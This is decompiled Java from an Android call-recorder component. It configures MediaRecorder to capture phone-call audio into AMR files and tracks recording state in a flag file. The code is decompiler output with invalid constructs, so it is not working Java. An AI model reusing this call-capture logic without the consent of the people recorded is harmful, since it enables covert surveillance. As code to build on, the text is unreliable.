package com.krecorder.call.callrecorder;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;
import com.krecorder.call.recording.MediaFormat;
import com.vvt.ak.a;
import com.vvt.io.p;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class b
  implements m
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private boolean c;
  private boolean d;
  private MediaRecorder e;
  private Context f;
  private String g;
  private int h;
  private n i;
  private File j;
  private j k;
  private int l;
  private Object m;
  private String n;
  
  public b(Context paramContext, Object paramObject, boolean paramBoolean, String paramString)
  {
    this.m = paramObject;
    this.f = paramContext;
    this.d = paramBoolean;
    this.l = 0;
    this.j = null;
    this.n = paramString;
    this.g = "Unknown Error";
    this.h = -1;
  }
  
  private void a(String paramString, boolean paramBoolean)
  {
    String str = "AndRecorderStateFlag.dat";
    for (;;)
    {
      try
      {
        str = p.a(paramString, str);
        boolean bool1 = a;
        if ((!bool1) || (paramBoolean))
        {
          localObject = new java/io/FileWriter;
          File localFile = new java/io/File;
          localFile.<init>(str);
          ((FileWriter)localObject).<init>(localFile);
          str = String.valueOf(paramBoolean);
          ((FileWriter)localObject).write(str);
          ((FileWriter)localObject).close();
          return;
        }
      }
      catch (IOException localIOException)
      {
        Object localObject;
        boolean bool2 = b;
        if (!bool2) {
          continue;
        }
        continue;
      }
      localObject = new java/io/File;
      ((File)localObject).<init>(str);
      ((File)localObject).delete();
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  public static boolean a(String paramString)
  {
    String str = p.a(paramString, "AndRecorderStateFlag.dat");
    boolean bool1 = com.vvt.io.d.f(str);
    boolean bool2 = a;
    if ((!bool2) || (bool1))
    {
      bool1 = false;
      str = null;
    }
    for (;;)
    {
      return bool1;
      bool1 = true;
    }
  }
  
  public void a(int paramInt)
  {
    Handler localHandler = new android/os/Handler;
    Object localObject = this.f.getMainLooper();
    localHandler.<init>((Looper)localObject);
    localObject = new com/krecorder/call/callrecorder/c;
    ((c)localObject).<init>(this, paramInt);
    localHandler.post((Runnable)localObject);
  }
  
  public void a(n paramn)
  {
    boolean bool = a;
    if (bool) {}
    this.i = paramn;
    Thread localThread = new java/lang/Thread;
    d locald = new com/krecorder/call/callrecorder/d;
    locald.<init>(this);
    localThread.<init>(locald);
    localThread.start();
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2, MediaFormat paramMediaFormat, int paramInt)
  {
    j localj = this.k;
    if (localj == null)
    {
      localj = new com/krecorder/call/callrecorder/j;
      localj.<init>();
      this.k = localj;
    }
    this.k.a(paramString1);
    this.k.b(paramString2);
    this.k.b(paramMediaFormat);
    this.k.b(paramInt);
  }
  
  public boolean a()
  {
    boolean bool1 = true;
    boolean bool2 = false;
    boolean bool3 = a;
    if (bool3) {}
    this.c = false;
    try
    {
      bool3 = this.d;
      if (bool3)
      {
        Exception localException1 = new java/lang/Exception;
        localObject1 = "Does not support microphone recording";
        localException1.<init>((String)localObject1);
        throw localException1;
      }
    }
    catch (IllegalStateException localIllegalStateException)
    {
      Object localObject1;
      bool3 = b;
      if (bool3) {}
      String str1 = localIllegalStateException.getMessage();
      this.g = str1;
      bool1 = false;
      str1 = null;
      for (;;)
      {
        return bool1;
        localObject1 = this.k;
        Object localObject2 = MediaFormat.AMR;
        int i1 = 1;
        int i2 = -1;
        int i3 = -1;
        ((j)localObject1).a((MediaFormat)localObject2, i1, i2, i3);
        localObject1 = new android/media/MediaRecorder;
        ((MediaRecorder)localObject1).<init>();
        this.e = ((MediaRecorder)localObject1);
        localObject1 = this.e;
        int i4 = 4;
        ((MediaRecorder)localObject1).setAudioSource(i4);
        localObject1 = this.e;
        i4 = 4;
        ((MediaRecorder)localObject1).setOutputFormat(i4);
        localObject1 = this.e;
        i4 = 2;
        ((MediaRecorder)localObject1).setAudioEncoder(i4);
        localObject1 = this.e;
        localObject2 = this.k;
        localObject2 = ((j)localObject2).c();
        localObject2 = ((File)localObject2).getAbsolutePath();
        ((MediaRecorder)localObject1).setOutputFile((String)localObject2);
        localObject1 = this.e;
        ((MediaRecorder)localObject1).prepare();
        bool2 = a;
        if (!bool2) {}
      }
    }
    catch (Exception localException2)
    {
      for (;;)
      {
        bool3 = b;
        if (bool3) {}
        String str2 = localException2.getMessage();
        this.g = str2;
        bool1 = false;
        str2 = null;
      }
    }
  }
  
  public void b(int paramInt)
  {
    this.l = paramInt;
  }
  
  public boolean b()
  {
    return this.c;
  }
  
  public String c()
  {
    return this.g;
  }
  
  public void c(int paramInt) {}
  
  public void d()
  {
    synchronized (this.m)
    {
      MediaRecorder localMediaRecorder = this.e;
      if (localMediaRecorder != null) {}
      try
      {
        localMediaRecorder = this.e;
        localMediaRecorder.release();
      }
      catch (Exception localException)
      {
        for (;;)
        {
          boolean bool = b;
          if (!bool) {}
        }
      }
      bool = false;
      localMediaRecorder = null;
      this.e = null;
      return;
    }
  }
  
  public void e()
  {
    boolean bool = a;
    if (bool) {}
    File localFile = this.j;
    if (localFile != null)
    {
      localFile = this.j;
      bool = localFile.exists();
      if (bool)
      {
        this.j.delete();
        bool = false;
        localFile = null;
        this.j = null;
      }
    }
  }
  
  public j f()
  {
    return this.k;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/krecorder/call/callrecorder/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */